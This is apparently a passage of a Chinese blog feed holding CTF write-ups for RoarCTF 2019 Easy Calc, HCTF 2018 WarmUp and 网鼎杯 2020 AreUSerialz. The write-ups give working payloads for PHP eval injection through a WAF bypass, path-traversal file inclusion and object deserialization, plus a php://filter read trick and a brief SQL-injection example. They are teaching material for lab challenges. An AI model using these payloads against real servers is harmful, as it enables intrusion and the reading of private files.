class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;\0Name\0username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;\0Name\0password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>注意，若是写python上传的话就这样写就好了，直接在浏览器上传，那就需要将\0改为%00，<br>修改为O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p><p>上传后得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RoarCTF 2019Easy Calc</title>
    <link href="/2022/03/03/RoarCTF-2019Easy-Calc/"/>
    <url>/2022/03/03/RoarCTF-2019Easy-Calc/</url>
    
    <content type="html"><![CDATA[<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>利用PHP的字符串解析特性绕过Waf</p><p>查看源码 发现calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组​$_POST。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/news.php?%20news[id%00=42&quot;+AND+1=0–<br></code></pre></td></tr></table></figure><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><p>1.删除空白符</p><p>2.将某些字符转换为下划线（包括空格）</p><p>我的理解：<br>假如waf不允许num变量传递字母：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话<br></code></pre></td></tr></table></figure><p>那么我们可以在num前加个空格：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://www.xxx.com/index.php? num = aaaa<br></code></pre></td></tr></table></figure><p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符</p><p>eval函数</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>() 函数把字符串按照 PHP 代码来计算。<br><br>该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br><br>如果没有在代码字符串中调用 <span class="hljs-keyword">return</span> 语句，则返回 <span class="hljs-literal">NULL</span>。如果代码中存在解析错误，则 <span class="hljs-built_in">eval</span>() 函数返回 <span class="hljs-literal">false</span>。<br></code></pre></td></tr></table></figure><p>eval函数 命令执行 查看目录<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">?%<span class="hljs-number">20</span>num=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">47</span>)));<br>这里由于单引号被过滤了，那就用<span class="hljs-title function_ invoke__">chr</span>()绕过，<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">47</span>)就是斜杠/<br><br><span class="hljs-title function_ invoke__">chr</span>() 函数从指定的 ASCII 值返回字符。<br><br>ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 <span class="hljs-number">0</span>，而十六进制值被定义为带前置 <span class="hljs-number">0</span>x。<br></code></pre></td></tr></table></figure><p>可以查看到 有f1agg<br>读取f1agg文件</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#?%20num=var_dump(file_get_contents(&#x27;/flagg&#x27;));</span><br>?%<span class="hljs-number">20</span>num=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">103</span>)));<br><br><span class="hljs-title function_ invoke__">file_get_contents</span>() 把整个文件读入一个字符串中。<br><br>该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCTF 2018WarmUp 文件包含</title>
    <link href="/2022/03/03/HCTF-2018WarmUp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/03/03/HCTF-2018WarmUp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h3 id="HCTF-2018-WarmUp-文件包含"><a href="#HCTF-2018-WarmUp-文件包含" class="headerlink" title="[HCTF 2018]WarmUp 文件包含"></a>[HCTF 2018]WarmUp 文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>发现source.php</p><p>先看此段代码，大致意思是。如果提交过来的file不是空的，并且是字符串，经过了emmm类中，checkFile函数的过滤。那么就执行包含文件。由此可知可能存在文件包含，目录穿越的漏洞。而要包含的就是ffffllllaaaagggg。</p><p>hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg 我们可以想象他传入checkFile函数要经历 第一次白名单验证 一次？过滤后他就是hint.php 再进行一次白名单验证 返回为真 则达成条件进行包含得到flag</p><p>最终payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//03b2cc85-7af4-439b-a06e-41da80ff6505.node3.buuoj.cn/index.php?file=hint.php?../../../../../ffffllllaaaagggg </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯 2020 青龙组AreUSerialz</title>
    <link href="/2022/03/03/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/"/>
    <url>/2022/03/03/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/</url>
    
    <content type="html"><![CDATA[<h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>2&#x2F;25&#x2F;2021</p><p>阴雨</p><p>后来，南山的风吹散了谷堆，北海的水淹没了墓碑，多少事沧桑巨变，无数人来了又回，可与你有关的点点滴滴，一直在我心上铭刻，不曾改变，也永不褪色。</p><p>PHP代码审计 反序列化的题目<br>我给源码增加了注释 方便阅读</p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//实例化对象时被调用 初始化参数值</span><br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;    <span class="hljs-comment">//如果op=1 调用write()方法</span><br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123; <span class="hljs-comment">//如果op=2 调用read()和output()方法</span><br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;                      <span class="hljs-comment">//否则调用output()传入参数Bad Hacker!</span><br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>); <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123; <span class="hljs-comment">//判断filename&amp;content是否为空</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;       <span class="hljs-comment">//判断content变量值的长度是否大于100</span><br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename, <span class="hljs-variable language_">$this</span>-&gt;content);  <span class="hljs-comment">//file_put_contents() 函数把一个字 </span><br>                                                                       <span class="hljs-comment">//符串写入文件中</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;                            <span class="hljs-comment">//否则调用output()传入参数Failed!</span><br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename); <span class="hljs-comment">//file_get_contents() 把整个文件读入一个字符串中</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;   <span class="hljs-comment">//__destruct()：当删除一个对象或对象操作终止时被调用。</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;    <span class="hljs-comment">//判断字符串的每个字符的ASCII值是否&gt;=32 &lt;=125</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))    <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123; <span class="hljs-comment">//GET方式接受一个str参数</span><br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);  <span class="hljs-comment">//将接收到的GET参数反序列化</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>思路</p><blockquote><p>GET一个str参数 str参数要判断每个字符的ASCII码值大小 不得小于32并且不得大于125 传入的参数反序列化之后若op&#x3D;1调用write()方法 op&#x3D;2的时候调用read()方法 按道理说op&#x3D;1的时候我可以写入一句话到一个文件中然后用菜刀连接 然而事实证明我没有权限 </p></blockquote><p>附图：</p><p><img src="https://i.loli.net/2021/03/02/GTeLoyZPYciHvRD.png" alt="66773-dujhgmvxs9i.png"></p><p>只能使op&#x3D;2 调用read()方法<br>编写序列化脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;<br></code></pre></td></tr></table></figure><p>直接传入payload不能直接看到flag 查看源码后可以看到flag</p><p><img src="https://i.loli.net/2021/03/02/vQx1jEJldFiprgc.png" alt="92528-n9gs1czw7od.png"><br><img src="https://blog.110022.xyz/usr/uploads/2021/02/112071442.png" alt="87045-teoev81dukl.png"></p><p>也可以使用php伪协议读取flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php://filter/read=convert.base64-encode/resource=[文件名]<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/02/MuLaFW2isRHZye3.png" alt="30865-3srjqv6f4tl.png"></p><p>因为是base64读取 解码后就是flag</p><p><img src="https://i.loli.net/2021/03/02/izklB3W4mYtdCGT.png" alt="59711-haupie5wg9i.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/2022/03/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/03/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
